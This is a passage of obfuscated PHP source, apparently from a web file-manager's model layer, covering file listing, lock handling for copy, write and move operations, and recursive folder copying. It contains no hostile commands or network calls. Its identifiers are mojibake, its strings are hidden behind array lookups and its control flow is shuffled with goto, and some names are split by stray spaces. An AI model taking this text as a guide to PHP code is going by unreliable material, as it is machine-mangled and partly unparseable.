LNG($bÁˆÁÉƒŠÌ[469]); if (!$CíÃÆ‹²Ø) { $eÕõ»¸ë‘°[$bÁˆÁÉƒŠÌ[28]] = $CæšøèØÕ‘; } } else { $AÏš¾•ÇÄà = Model($bÁˆÁÉƒŠÌ[470])->getInfoSimple($eÕõ»¸ë‘°[$bÁˆÁÉƒŠÌ[452]]); $CæšøèØÕ‘ = LNG($bÁˆÁÉƒŠÌ[471]) . $bÁˆÁÉƒŠÌ[154] . $AÏš¾•ÇÄà[$bÁˆÁÉƒŠÌ[28]] . $bÁˆÁÉƒŠÌ[472]; } } else { if ($eÕõ»¸ë‘°[$bÁˆÁÉƒŠÌ[368]] == self::TYPE_GROUP) { $AÏš¾•ÇÄà = Model($bÁˆÁÉƒŠÌ[454])->getInfoSimple($eÕõ»¸ë‘°[$bÁˆÁÉƒŠÌ[452]]); $CæšøèØÕ‘ = $AÏš¾•ÇÄà[$bÁˆÁÉƒŠÌ[28]]; } else { if ($eÕõ»¸ë‘°[$bÁˆÁÉƒŠÌ[368]] == self::TYPE_SYSTEM) { $AÏš¾•ÇÄà = $this->sourceInfo($CíÃÆ‹²Ø[0], !0); $CæšøèØÕ‘ = $AÏš¾•ÇÄà[$bÁˆÁÉƒŠÌ[28]]; } } } $CæšøèØÕ‘ = $CæšøèØÕ‘ ? $bÁˆÁÉƒŠÌ[8] . $CæšøèØÕ‘ . $bÁˆÁÉƒŠÌ[8] : $bÁˆÁÉƒŠÌ[8]; return $CæšøèØÕ‘; } protected function _listAppendUser(&$AÆÌ«ÀìÛÓ) { $Cİ•¿ÄÜ—¾ =& $_SERVER[¼]; $a÷ìéß† = array_to_keyvalue($AÆÌ«ÀìÛÓ, $Cİ•¿ÄÜ—¾[33], $Cİ•¿ÄÜ—¾[375]); $bñ‰°Ì¼ŸÍ = array_to_keyvalue($AÆÌ«ÀìÛÓ, $Cİ•¿ÄÜ—¾[33], $Cİ•¿ÄÜ—¾[376]); $Cª‘£ë·Ë = array_merge($a÷ìéß†, $bñ‰°Ì¼ŸÍ); $F£Œëñ¼Ó£ = Model($Cİ•¿ÄÜ—¾[473])->userListInfo($Cª‘£ë·Ë); foreach ($AÆÌ«ÀìÛÓ as &$fİ¦¾š Ñõ) { $c‡ğÜª‚¾³ = $fİ¦¾š Ñõ[$Cİ•¿ÄÜ—¾[375]]; $fİ¦¾š Ñõ[$Cİ•¿ÄÜ—¾[375]] = $F£Œëñ¼Ó£[$c‡ğÜª‚¾³] ? $F£Œëñ¼Ó£[$c‡ğÜª‚¾³] : !1; $c‡ğÜª‚¾³ = $fİ¦¾š Ñõ[$Cİ•¿ÄÜ—¾[376]]; $fİ¦¾š Ñõ[$Cİ•¿ÄÜ—¾[376]] = $F£Œëñ¼Ó£[$c‡ğÜª‚¾³] ? $F£Œëñ¼Ó£[$c‡ğÜª‚¾³] : !1; if (isset($fİ¦¾š Ñõ[$Cİ•¿ÄÜ—¾[413]]) && $fİ¦¾š Ñõ[$Cİ•¿ÄÜ—¾[413]][$Cİ•¿ÄÜ—¾[474]]) { $bßØÁÀ¦óÌ = $GLOBALS[$Cİ•¿ÄÜ—¾[6]][$Cİ•¿ÄÜ—¾[84]][$Cİ•¿ÄÜ—¾[475]]; if ($fİ¦¾š Ñõ[$Cİ•¿ÄÜ—¾[413]][$Cİ•¿ÄÜ—¾[476]] <= time() - $bßØÁÀ¦óÌ) { $this->metaSet($fİ¦¾š Ñõ[$Cİ•¿ÄÜ—¾[366]], $Cİ•¿ÄÜ—¾[474], null); $this->metaSet($fİ¦¾š Ñõ[$Cİ•¿ÄÜ—¾[366]], $Cİ•¿ÄÜ—¾[476], null); unset($fİ¦¾š Ñõ[$Cİ•¿ÄÜ—¾[413]][$Cİ•¿ÄÜ—¾[474]]); continue; } $bÈ±“íÅÅ = $fİ¦¾š Ñõ[$Cİ•¿ÄÜ—¾[413]][$Cİ•¿ÄÜ—¾[474]]; $fİ¦¾š Ñõ[$Cİ•¿ÄÜ—¾[413]][$Cİ•¿ÄÜ—¾[477]] = Model($Cİ•¿ÄÜ—¾[473])->getInfoSimpleOuter($bÈ±“íÅÅ); } } } public function parentLevelArray($dÒÈÖ’·Ë³) { $B¾ô¥æÎÛë =& $_SERVER[¼]; $dÒÈÖ’·Ë³ = explode($B¾ô¥æÎÛë[47], trim($dÒÈÖ’·Ë³, $B¾ô¥æÎÛë[47])); return array_remove_value($dÒÈÖ’·Ë³, $B¾ô¥æÎÛë[464]); } public function listAll($C‘õ®¨‹îâ) { goto e¹‘°µÜ; e¹‘°µÜ: $c§…‡ø©™¾ =& $_SERVER[¼]; $CÛ¬”¹Ÿ‹‰ = $this->sourceInfo($C‘õ®¨‹îâ); $Bö…§¢¦¼ = array($c§…‡ø©™¾[478] => array($c§…‡ø©™¾[479], $CÛ¬”¹Ÿ‹‰[$c§…‡ø©™¾[455]] . $C‘õ®¨‹îâ . $c§…‡ø©™¾[480]), $c§…‡ø©™¾[481] => 0); goto d‚ºê‰Ãù; Fˆµ¯½®Ú±: $F‡Š±©ëØ = array_to_keyvalue($F‡Š±©ëØ, $c§…‡ø©™¾[366]); $BÑĞ®Âï—ê = "\57{$CÛ¬”¹Ÿ‹‰[$c§…‡ø©™¾[28]]}\57"; $BÑĞ®Âï—ê = $BÑĞ®Âï—ê == $c§…‡ø©™¾[463] ? $c§…‡ø©™¾[8] : $BÑĞ®Âï—ê; goto cã÷¿Òô; cã÷¿Òô: $Dó»‰÷•¹Œ = array(); foreach ($F‡Š±©ëØ as $Dğ˜Ø¬®ÕÇ => $e‡àğ¬øÕÊ) { goto EÇ˜³Ô…Ğ; F—Š©áë×: if (!$e‡àğ¬øÕÊ[$c§…‡ø©™¾[367]]) { $f‘É‡Ûî°Á[$c§…‡ø©™¾[415]] = $e‡àğ¬øÕÊ[$c§…‡ø©™¾[415]]; $f‘É‡Ûî°Á[$c§…‡ø©™¾[485]] = $e‡àğ¬øÕÊ[$c§…‡ø©™¾[75]]; } $Dó»‰÷•¹Œ[] = $f‘É‡Ûî°Á; goto bø°Ì›Ôš“; EÇ˜³Ô…Ğ: $e›Š“£Õ´Ø = $this->parentLevelArray($e‡àğ¬øÕÊ[$c§…‡ø©™¾[455]]); array_shift($e›Š“£Õ´Ø); $cƒÙ«·ŠŒ = $BÑĞ®Âï—ê; goto dÎÎ‡Ìï¡Ä; E´§í¢ Š¼: $cƒÙ«·ŠŒ = str_replace($c§…‡ø©™¾[463], $c§…‡ø©™¾[8], $cƒÙ«·ŠŒ); $cƒÙ«·ŠŒ = str_replace($c§…‡ø©™¾[463], $c§…‡ø©™¾[8], $cƒÙ«·ŠŒ); $f‘É‡Ûî°Á = array($c§…‡ø©™¾[384] => str_replace($c§…‡ø©™¾[463], $c§…‡ø©™¾[8], $cƒÙ«·ŠŒ), $c§…‡ø©™¾[484] => intval($e‡àğ¬øÕÊ[$c§…‡ø©™¾[367]]), $c§…‡ø©™¾[388] => $this->pathInfoFilter($e‡àğ¬øÕÊ, !0)); goto F—Š©áë×; dÎÎ‡Ìï¡Ä: for ($däø¸Ô¦¥ = 0; $däø¸Ô¦¥ < count($e›Š“£Õ´Ø); $däø¸Ô¦¥++) { $cƒÙ«·ŠŒ .= $F‡Š±©ëØ[$e›Š“£Õ´Ø[$däø¸Ô¦¥]][$c§…‡ø©™¾[28]] . $c§…‡ø©™¾[8]; } $cƒÙ«·ŠŒ .= $e‡àğ¬øÕÊ[$c§…‡ø©™¾[28]]; if ($e‡àğ¬øÕÊ[$c§…‡ø©™¾[367]]) { $cƒÙ«·ŠŒ .= $c§…‡ø©™¾[8]; } goto E´§í¢ Š¼; bø°Ì›Ôš“: } return $Dó»‰÷•¹Œ; goto cŠÖƒò‡¹„; d‚ºê‰Ãù: $d¢’™ï³›‡ = $c§…‡ø©™¾[482]; $BòµÌ‡ñÛ = "\x4c\105\x46\124\40\112\117\x49\x4e\x20{$this->tablePrefix}\x69\157\x5f\x66\x69\x6c\x65\x20\x66\151\x6c\145\40\157\156\x20\163\x6f\x75\162\x63\x65\x2e\146\x69\x6c\145\111\104\x20\x3d\x20\146\151\x6c\x65\x2e\x66\x69\x6c\x65\111\x44"; $F‡Š±©ëØ = $this->alias($c§…‡ø©™¾[483])->field($d¢’™ï³›‡)->where($Bö…§¢¦¼)->join($BòµÌ‡ñÛ)->select(); goto aö¥ñîÜØµ; aö¥ñîÜØµ: $this->_listAppendAuth($F‡Š±©ëØ); $this->_listAppendUser($F‡Š±©ëØ); $this->_listAppendPath($F‡Š±©ëØ); goto Fˆµ¯½®Ú±; cŠÖƒò‡¹„: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($aŠç‘·È¥) { goto A‡ˆÒ§Ã•‡; A‡ˆÒ§Ã•‡: $D”÷ŒØ “ô =& $_SERVER[¼]; if (!$this->allowLock()) { return; } $this->_lockCheck($D”÷ŒØ “ô[486], $aŠç‘·È¥); goto dÍñ°ÌåÓ; F×Ë†ä˜ïâ: $this->_lockEvent($aŠç‘·È¥, array($D”÷ŒØ “ô[489], $D”÷ŒØ “ô[490]), $Fï£Ë‘ÏåÆ); $this->_lockCheckEnd($D”÷ŒØ “ô[486], $aŠç‘·È¥); goto fö“‡â¸†‰; dÍñ°ÌåÓ: $Fï£Ë‘ÏåÆ = 1; $this->_lockEvent($aŠç‘·È¥, array($D”÷ŒØ “ô[487], $D”÷ŒØ “ô[488]), $Fï£Ë‘ÏåÆ); $this->_lockParent($aŠç‘·È¥, array($D”÷ŒØ “ô[488]), $Fï£Ë‘ÏåÆ); goto F×Ë†ä˜ïâ; fö“‡â¸†‰: } public function lockCopyEnd($eèß„ÈãÕ) { $có‡¥ÆÍ¯Œ =& $_SERVER[¼]; if (!$this->allowLock()) { return; } $A¼‘ù¡íÁé = 0; $this->_lockEvent($eèß„ÈãÕ, array($có‡¥ÆÍ¯Œ[487], $có‡¥ÆÍ¯Œ[488]), $A¼‘ù¡íÁé); $this->_lockParent($eèß„ÈãÕ, array($có‡¥ÆÍ¯Œ[488]), $A¼‘ù¡íÁé); $this->_lockEvent($eèß„ÈãÕ, array($có‡¥ÆÍ¯Œ[489], $có‡¥ÆÍ¯Œ[490]), $A¼‘ù¡íÁé); } public function lockWriteStart($A—Ò»„¼©, $eÅˆÎÕãÓ¯ = '') { goto AÛ·ÈÃ”é–; AÛ·ÈÃ”é–: $DƒÄ‘®âÒå =& $_SERVER[¼]; if (!$this->allowLock()) { return; } $this->_lockCheck($DƒÄ‘®âÒå[487], $A—Ò»„¼©); goto cµŸåÎÑ¶‘; B§óãÚáØ†: $this->_lockParent($A—Ò»„¼©, array($DƒÄ‘®âÒå[486], $DƒÄ‘®âÒå[488]), $cÜ¡šï“ã); $this->_lockCheckEnd($DƒÄ‘®âÒå[487], $A—Ò»„¼©); goto F¶‚¹ŸÅÜ‰; cµŸåÎÑ¶‘: $cÜ¡šï“ã = 1; $this->_lockKey($DƒÄ‘®âÒå[491] . $A—Ò»„¼© . $DƒÄ‘®âÒå[93] . $eÅˆÎÕãÓ¯, $cÜ¡šï“ã); $this->_lockEvent($A—Ò»„¼©, array($DƒÄ‘®âÒå[486], $DƒÄ‘®âÒå[488]), $cÜ¡šï“ã); goto B§óãÚáØ†; F¶‚¹ŸÅÜ‰: } public function lockWriteEnd($B›¥¸é«š¨, $A­Œ­Í±õ‚ = '') { $A‹®‰–Ëâˆ =& $_SERVER[¼]; if (!$this->allowLock()) { return; } $eŒÇìÆë  = 0; $this->_lockKey($A‹®‰–Ëâˆ[491] . $B›¥¸é«š¨ . $A‹®‰–Ëâˆ[93] . $A­Œ­Í±õ‚, $eŒÇìÆë ); $this->_lockEvent($B›¥¸é«š¨, array($A‹®‰–Ëâˆ[486], $A‹®‰–Ëâˆ[488]), $eŒÇìÆë ); $this->_lockParent($B›¥¸é«š¨, array($A‹®‰–Ëâˆ[486], $A‹®‰–Ëâˆ[488]), $eŒÇìÆë ); } public function lockMoveStart($A„¾¶ãˆ‰Î) { goto bâÓîÒÖ÷; B ¥´­İ×À: $this->_lockParent($A„¾¶ãˆ‰Î, array($F™™ÊóõØŸ[486], $F™™ÊóõØŸ[488]), $e¥ø˜‰¿ ); $this->_lockEvent($A„¾¶ãˆ‰Î, array($F™™ÊóõØŸ[493], $F™™ÊóõØŸ[489], $F™™ÊóõØŸ[490]), $e¥ø˜‰¿ ); $this->_lockCheckEnd($F™™ÊóõØŸ[488], $A„¾¶ãˆ‰Î); goto Cš›×¹„·À; C¸âæ²—¹µ: $e¥ø˜‰¿  = 1; $this->_lockKey($F™™ÊóõØŸ[492] . $A„¾¶ãˆ‰Î, $e¥ø˜‰¿ ); $this->_lockEvent($A„¾¶ãˆ‰Î, array($F™™ÊóõØŸ[486], $F™™ÊóõØŸ[487]), $e¥ø˜‰¿ ); goto B ¥´­İ×À; bâÓîÒÖ÷: $F™™ÊóõØŸ =& $_SERVER[¼]; if (!$this->allowLock()) { return; } $this->_lockCheck($F™™ÊóõØŸ[488], $A„¾¶ãˆ‰Î); goto C¸âæ²—¹µ; Cš›×¹„·À: } public function lockMoveEnd($F½›ºŠõš) { goto DáÏÈÄò†ñ; bÇÅ½Ğï¾: $this->_lockKey($Aå‡Ö·¸‡¼[492] . $F½›ºŠõš, $açŒß£ÉÇ); $this->_lockEvent($F½›ºŠõš, array($Aå‡Ö·¸‡¼[486], $Aå‡Ö·¸‡¼[487]), $açŒß£ÉÇ); $this->_lockParent($F½›ºŠõš, array($Aå‡Ö·¸‡¼[486], $Aå‡Ö·¸‡¼[488]), $açŒß£ÉÇ); goto d¹×³†µÂ´; DáÏÈÄò†ñ: $Aå‡Ö·¸‡¼ =& $_SERVER[¼]; if (!$this->allowLock()) { return; } $açŒß£ÉÇ = 0; goto bÇÅ½Ğï¾; d¹×³†µÂ´: $this->_lockEvent($F½›ºŠõš, array($Aå‡Ö·¸‡¼[493], $Aå‡Ö·¸‡¼[489], $Aå‡Ö·¸‡¼[490]), $açŒß£ÉÇ); goto cÕãµ¢Ñ…; cÕãµ¢Ñ…: } private function _lockCheck($FÌÒ†Ñ¤™», $BÈ›Ğ²†²) { goto AÏí˜ÊËÚ; B¡¼Ö­±²‰: CacheLock::setErrorMsg($b¯Ò«ÙÃçÎ[154] . htmlspecialchars($CÉõÌŸä¢[$b¯Ò«ÙÃçÎ[28]]) . $b¯Ò«ÙÃçÎ[472] . $FÙ­‘œÕä); $this->_lockKey($d¹‘£…»âÃ, 1); $this->_lockKey($d¹‘£…»âÃ, 0); goto a°ó„ÑÑÄ‘; AÏí˜ÊËÚ: $b¯Ò«ÙÃçÎ =& $_SERVER[¼]; $CÉõÌŸä¢ = $this->sourceInfo($BÈ›Ğ²†²); $d¹‘£…»âÃ = $FÌÒ†Ñ¤™» . $b¯Ò«ÙÃçÎ[93] . $BÈ›Ğ²†²; goto B¶™åÄ£¶«; B¶™åÄ£¶«: $this->_lockTimeStart[$d¹‘£…»âÃ] = timeFloat(); if (!is_array($CÉõÌŸä¢)) { return; } $FÙ­‘œÕä = LNG($b¯Ò«ÙÃçÎ[494]); goto B¡¼Ö­±²‰; a°ó„ÑÑÄ‘: $d ‹Òæ½Û« = array_reverse($this->parentLevelArray($CÉõÌŸä¢[$b¯Ò«ÙÃçÎ[455]])); foreach ($d ‹Òæ½Û« as $CãË¼µ¤š«) { $d¹‘£…»âÃ = $FÌÒ†Ñ¤™» . $b¯Ò«ÙÃçÎ[495] . $CãË¼µ¤š«; if (CacheLock::lockGet($b¯Ò«ÙÃçÎ[496] . $d¹‘£…»âÃ)) { $CÉõÌŸä¢ = $this->sourceInfo($CãË¼µ¤š«); CacheLock::setErrorMsg($b¯Ò«ÙÃçÎ[154] . htmlspecialchars($CÉõÌŸä¢[$b¯Ò«ÙÃçÎ[28]]) . $b¯Ò«ÙÃçÎ[472] . $FÙ­‘œÕä); $this->_lockKey($d¹‘£…»âÃ, 1); $this->_lockKey($d¹‘£…»âÃ, 0); } } goto cÑê°Ö£ŠŞ; cÑê°Ö£ŠŞ: } private function _lockCheckEnd($f¢–¤Â«í, $BÛŸñ¥ØÈ) { goto FÀ—Ø™ÒÉ; FÀ—Ø™ÒÉ: $e™ÑğÉßéñ =& $_SERVER[¼]; $B…†„ôî£õ = $f¢–¤Â«í . $e™ÑğÉßéñ[93] . $BÛŸñ¥ØÈ; CacheLock::setErrorMsg($e™ÑğÉßéñ[358]); goto a‘ØŒ¯›; a‘ØŒ¯›: if (!isset($this->_lockTimeStart[$B…†„ôî£õ])) { return; } $B²•ƒéâ©î = timeFloat() - $this->_lockTimeStart[$B…†„ôî£õ]; unset($this->_lockTimeStart[$B…†„ôî£õ]); goto CİŸÙàç°ˆ; CİŸÙàç°ˆ: if ($B²•ƒéâ©î > 0.5) { unset(self::$cacheSourceInfo[$e™ÑğÉßéñ[406] . $BÛŸñ¥ØÈ]); } $dØØ³îÀ = $this->sourceInfo($BÛŸñ¥ØÈ); if (!$dØØ³îÀ) { show_json(LNG($e™ÑğÉßéñ[102]), !1); } goto bÚø«à½ªª; bÚø«à½ªª: } private function _lockParent($Aš¾ëÜœì, $BÏ¹Ñ¨À†, $aéãòÃ˜) { if (!$this->autoLockSet) { return; } $dğ‘½ßÒ§¡ = $this->sourceInfo($Aš¾ëÜœì); if (!is_array($dğ‘½ßÒ§¡)) { return; } $Cêİ£ç‰“ = array_reverse($this->parentLevelArray($dğ‘½ßÒ§¡[$_SERVER[¼][455]])); foreach ($Cêİ£ç‰“ as $dÕ¡¬¦Â¯) { $this->_lockEvent($dÕ¡¬¦Â¯, $BÏ¹Ñ¨À†, $aéãòÃ˜); } } private function _lockEvent($dÇŸ‹‚ÙŸï, $aŞ—Ó«ÚÂì, $BÒ×…Ñ¥„) { $E—¸¯Ó¹ê =& $_SERVER[¼]; if (!$this->autoLockSet) { return; } foreach ($aŞ—Ó«ÚÂì as $cË¶†ï¢Şå) { $FÇ–›íˆÓ = $cË¶†ï¢Şå . $E—¸¯Ó¹ê[93] . $dÇŸ‹‚ÙŸï; if ($BÒ×…Ñ¥„ && CacheLock::lockGet($E—¸¯Ó¹ê[496] . $FÇ–›íˆÓ)) { continue; } $this->_lockKey($FÇ–›íˆÓ, $BÒ×…Ñ¥„); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($cµ¦›ÜÅöá, $Aõ·å–±Õì = 1) { $fİ•Ûõù¯ = $_SERVER[¼][496] . md5($cµ¦›ÜÅöá); if ($Aõ·å–±Õì) { if (isset(self::$_lockItemArr[$fİ•Ûõù¯])) { return; } self::$_lockItemArr[$fİ•Ûõù¯] = 1; CacheLock::lock($fİ•Ûõù¯, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$fİ•Ûõù¯])) { return; } unset(self::$_lockItemArr[$fİ•Ûõù¯]); CacheLock::unlock($fİ•Ûõù¯); } } public function isParentOf($f¬”Ôø»øÒ, $Cªµ¨©Ğœ) { goto a»¶ĞãéÕ; EÏ’Ğµ¥°ã: $AâÂÁâíœ = $bã˜øÁƒ½[$dë“Á›ï¯[455]] . $bã˜øÁƒ½[$dë“Á›ï¯[366]] . $dë“Á›ï¯[47]; $D İ‹œª«™ = $fˆ¿òµã[$dë“Á›ï¯[455]] . $fˆ¿òµã[$dë“Á›ï¯[366]] . $dë“Á›ï¯[47]; $CÌá‚›×á§ = strpos($D İ‹œª«™, $AâÂÁâíœ) === 0; goto cŸ¹Ïˆ·•›; a»¶ĞãéÕ: $dë“Á›ï¯ =& $_SERVER[¼]; $bã˜øÁƒ½ = $this->sourceInfo($f¬”Ôø»øÒ); $fˆ¿òµã = $this->sourceInfo($Cªµ¨©Ğœ); goto EÏ’Ğµ¥°ã; cŸ¹Ïˆ·•›: return $CÌá‚›×á§; goto fƒ¢Ş†”¬; fƒ¢Ş†”¬: } private $targetIsDelete = 0; public function copy($Cæ‰×ô±ä, $bÕÇ·‡»èÛ, $f„Û°ÉŒƒª = REPEAT_REPLACE, $AµÉå¢ ä— = '') { goto C ‰ª¡‹î¾; c»æÌÏ…ã²: if ($AÇìšæ¶Ï§[$b²¾Ûù–°[367]] == $b²¾Ûù–°[83] && $e‚ÏéÀê¥ == $C£‹¶á”ç) { $this->folderSizeResetChildren($e‚ÏéÀê¥); } Model($b²¾Ûù–°[500])->addAll($fí£ÙŠ…°ª[$b²¾Ûù–°[498]], array(), !0); if ($e‚ÏéÀê¥ != $C£‹¶á”ç || $AÇìšæ¶Ï§[$b²¾Ûù–°[367]] == $b²¾Ûù–°[83]) { Model($b²¾Ûù–°[501])->eventCopy($C£‹¶á”ç); } goto dƒì‡„ÖØ; dƒì‡„ÖØ: $this->saveAll($fí£ÙŠ…°ª[$b²¾Ûù–°[499]]); Model($b²¾Ûù–°[164])->linkAdd($fí£ÙŠ…°ª[$b²¾Ûù–°[497]]); $this->folderSizeReset($bÕÇ·‡»èÛ); goto b‹©²Ö; EæèæÛ´‹÷: if (!$AÇìšæ¶Ï§ || !$cĞôÂ¹§ë² || $cĞôÂ¹§ë²[$b²¾Ûù–°[367]] != $b²¾Ûù–°[83]) { return !1; } if ($this->isParentOf($Cæ‰×ô±ä, $bÕÇ·‡»èÛ)) { return !1; } $F¦‰ÑÂÈ· = $AµÉå¢ ä— ? $AµÉå¢ ä— : $AÇìšæ¶Ï§[$b²¾Ûù–°[28]]; goto f¿°Ü¢; aĞç¨Ì³‰Ü: $this->targetIsDelete = intval($AÇìšæ¶Ï§[$b²¾Ûù–°[393]]); $e‚ÏéÀê¥ = $this->fileNameExistCache($bÕÇ·‡»èÛ, $AÇìšæ¶Ï§[$b²¾Ûù–°[28]]); $C£‹¶á”ç = $this->_copy($Cæ‰×ô±ä, $bÕÇ·‡»èÛ, $f„Û°ÉŒƒª, $fí£ÙŠ…°ª, !0, $AµÉå¢ ä—); goto cÃƒÑ ĞÅ; b‹©²Ö: $this->updateModifyTime($bÕÇ·‡»èÛ); return $C£‹¶á”ç; goto D†’ÎßíÜÁ; C ‰ª¡‹î¾: $b²¾Ûù–° =& $_SERVER[¼]; $AÇìšæ¶Ï§ = $this->sourceInfo($Cæ‰×ô±ä); $cĞôÂ¹§ë² = $this->sourceInfo($bÕÇ·‡»èÛ); goto EæèæÛ´‹÷; f¿°Ü¢: $this->lockCopyStart($Cæ‰×ô±ä); $this->lockWriteStart($bÕÇ·‡»èÛ, $F¦‰ÑÂÈ·); $fí£ÙŠ…°ª = array($b²¾Ûù–°[497] => array(), $b²¾Ûù–°[498] => array(), $b²¾Ûù–°[499] => array()); goto aĞç¨Ì³‰Ü; cÃƒÑ ĞÅ: $this->_childrenListClear(); $this->lockCopyEnd($Cæ‰×ô±ä); $this->lockWriteEnd($bÕÇ·‡»èÛ, $F¦‰ÑÂÈ·); goto c»æÌÏ…ã²; D†’ÎßíÜÁ: } private function _copy($DÆÊçƒÌ´Ö, $bçŠ©¨Æ°, $Aßï¯“Ş½, &$D®ÂšªĞÄˆ, $EÜÔÇÑŸ–, $a‚°ô˜Éø = '') { goto dµ×ŒÜŞ§˜; Aæİõ¨ä¹Ò: if (!$E‹Àíâ˜Ã) { return $this->_copyCreate($DÆÊçƒÌ´Ö, $bçŠ©¨Æ°, $d·¤Ç•ŞÂó, $D®ÂšªĞÄˆ); } $D¢—ÊËìå = $E‹Àíâ˜Ã; if ($f‡Ò§‡Êñ) { if ($Aßï¯“Ş½ == REPEAT_RENAME_FOLDER) { $d·¤Ç•ŞÂó = $this->fileNameAutoCache($bçŠ©¨Æ°, $d·¤Ç•ŞÂó, $Aßï¯“Ş½, $f‡Ò§‡Êñ); $D¢—ÊËìå = $this->_copyCreate($DÆÊçƒÌ´Ö, $bçŠ©¨Æ°, $d·¤Ç•ŞÂó, $D®ÂšªĞÄˆ); } else { $dİÓÎ²¡¢ = $this->_childrenList($DÆÊçƒÌ´Ö); foreach ($dİÓÎ²¡¢ as $C´ñìñŠÜ) { $this->_copy($C´ñìñŠÜ[$Eğå¶‚¾ë[366]], $E‹Àíâ˜Ã, $Aßï¯“Ş½, $D®ÂšªĞÄˆ, !1); } } } else { if ($Aßï¯“Ş½ == REPEAT_RENAME || $Aßï¯“Ş½ == REPEAT_RENAME_FOLDER) { $d·¤Ç•ŞÂó = $this->fileNameAutoCache($bçŠ©¨Æ°, $d·¤Ç•ŞÂó, $Aßï¯“Ş½, $f‡Ò§‡Êñ); $D¢—ÊËìå = $this->_copyCreate($DÆÊçƒÌ´Ö, $bçŠ©¨Æ°, $d·¤Ç•ŞÂó, $D®ÂšªĞÄˆ); } else { if ($Aßï¯“Ş½ == REPEAT_REPLACE) { $d—©Æ“Â‹Š = $this->sourceInfoCache($E‹Àíâ˜Ã); $EÕ·ÁÑ„Ôì = $this->fileHistory($d—©Æ“Â‹Š, $aÇ†”¥‡[$Eğå¶‚¾ë[415]], $aÇ†”¥‡[$Eğå¶‚¾ë[77]]); if ($EÕ·ÁÑ„Ôì) { $D®ÂšªĞÄˆ[$Eğå¶‚¾ë[497]][] = $aÇ†”¥‡[$Eğå¶‚¾ë[415]]; } } else { if ($Aßï¯“Ş½ == REPEAT_SKIP) { } } } Hook::trigger($Eğå¶‚¾ë[502], array($Eğå¶‚¾ë[503], $aÇ†”¥‡, 0)); } goto a³¯¾¿‹Ì; a³¯¾¿‹Ì: return $D¢—ÊËìå; goto e»šÃÄ‹¤†; eïÔÅ«È©¨: $d·¤Ç•ŞÂó = $a‚°ô˜Éø ? $a‚°ô˜Éø : $aÇ†”¥‡[$Eğå¶‚¾ë[28]]; $E‹Àíâ˜Ã = $this->fileNameExistCache($bçŠ©¨Æ°, $d·¤Ç•ŞÂó); if ($EÜÔÇÑŸ–) { $this->_childrenAllMake($DÆÊçƒÌ´Ö); if ($f‡Ò§‡Êñ && $E‹Àíâ˜Ã) { $this->_childrenAllMake($E‹Àíâ˜Ã); } } goto Aæİõ¨ä¹Ò; dµ×ŒÜŞ§˜: $Eğå¶‚¾ë =& $_SERVER[¼]; $aÇ†”¥‡ = $this->sourceInfoCache($DÆÊçƒÌ´Ö); $f‡Ò§‡Êñ = $aÇ†”¥‡[$Eğå¶‚¾ë[367]] == $Eğå¶‚¾ë[83]; goto eïÔÅ«È©¨; e»šÃÄ‹¤†: } private function _copyCreate($dšº‹äéñ‹, $Cº“‡ÙÍ‡À, $fÈ§¦š„ß©, &$eñóÖÃ×) { goto AêĞ†³Ñª±; fÊ‰÷÷ãŠÖ: if ($bé‡Ù‘Á’Ê[$b¢‰óù«ÓŞ[367]] != $b¢‰óù«ÓŞ[83]) { $eñóÖÃ×[$b¢‰óù«ÓŞ[497]][] = $bé‡Ù‘Á’Ê[$b¢‰óù«ÓŞ[415]]; return $A­¿Úôá¸“; } $aŸˆ‘˜¦ = array(); $B„Šä©åêÏ = array(); goto E¿°İïÊßÕ; E¿°İïÊßÕ: $this->_childrenListAll($dšº‹äéñ‹, $aŸˆ‘˜¦); $D‚±Ğ« ÷ = count($aŸˆ‘˜¦); if ($D‚±Ğ« ÷ == 0) { return $A­¿Úôá¸“; } goto fÓÉ‘Ê¸É»; fƒ“‰ßá¤œ: $Dˆ¸Û—¤¢ï[$dšº‹äéñ‹] = $A­¿Úôá¸“; $EŞ»¬Ï³çò = array(); $D’ˆÓïµà = array(); goto f‘Š“š´; f‘Š“š´: foreach ($cà¸‰Èêïª as $Cà‚“¤°íì) { $cœë¦œÙÉñ = $Cà‚“¤°íì[$b¢‰óù«ÓŞ[366]]; $båà×‚å¹‘ = $this->_childrenMatch($Dˆ¸Û—¤¢ï, $Cà‚“¤°íì, $a¤Î’•Ëô¶); $EŞ»¬Ï³çò[] = array($b¢‰óù«ÓŞ[366], $cœë¦œÙÉñ, $b¢‰óù«ÓŞ[457], $båà×‚å¹‘[$b¢‰óù«ÓŞ[457]]); $D’ˆÓïµà[] = array($b¢‰óù«ÓŞ[366], $cœë¦œÙÉñ, $b¢‰óù«ÓŞ[455], $båà×‚å¹‘[$b¢‰óù«ÓŞ[455]]); $this->_copyApplyMeta($Cà‚“¤°íì, $eñóÖÃ×); if ($Cà‚“¤°íì[$b¢‰óù«ÓŞ[367]] != $b¢‰óù«ÓŞ[83]) { $eñóÖÃ×[$b¢‰óù«ÓŞ[497]][] = $Cà‚“¤°íì[$b¢‰óù«ÓŞ[415]]; } } $this->chunkEventSet($b¢‰óù«ÓŞ[509], array($b¢‰óù«ÓŞ[510], $Cõ¼²‘³øŞ, $D‚±Ğ« ÷)); $this->saveAll($EŞ»¬Ï³çò); goto F®İ£ÓÖ¶±; B”Å˜ÀŒ¤: $A­¿Úôá¸“ = $this->add($Cõ¼²‘³øŞ); $BØ•¾º˜í = array($b¢‰óù«ÓŞ[366] => $A­¿Úôá¸“, $b¢‰óù«ÓŞ[28] => $fÈ§¦š„ß©); $this->_copyApplyMeta($BØ•¾º˜í, $eñóÖÃ×); goto fÊ‰÷÷ãŠÖ; fÓÉ‘Ê¸É»: $a¤Î’•Ëô¶ = $this->sourceInfo($A­¿Úôá¸“); foreach ($aŸˆ‘˜¦ as $Cà‚“¤°íì) { $DØ‘ òù¹ = $this->_makeItemData($Cà‚“¤°íì, $a¤Î’•Ëô¶, $Cà‚“¤°íì[$b¢‰óù«ÓŞ[28]]); $DØ‘ òù¹[$b¢‰óù«ÓŞ[455]] = $Cà‚“¤°íì[$b¢‰óù«ÓŞ[455]]; $B„Šä©åêÏ[] = $DØ‘ òù¹; } $this->chunkEventSet($b¢‰óù«ÓŞ[507], array($b¢‰óù«ÓŞ[508], $Cõ¼²‘³øŞ, $D‚±Ğ« ÷)); goto D¸õÍö¸¡; AêĞ†³Ñª±: $b¢‰óù«ÓŞ =& $_SERVER[¼]; 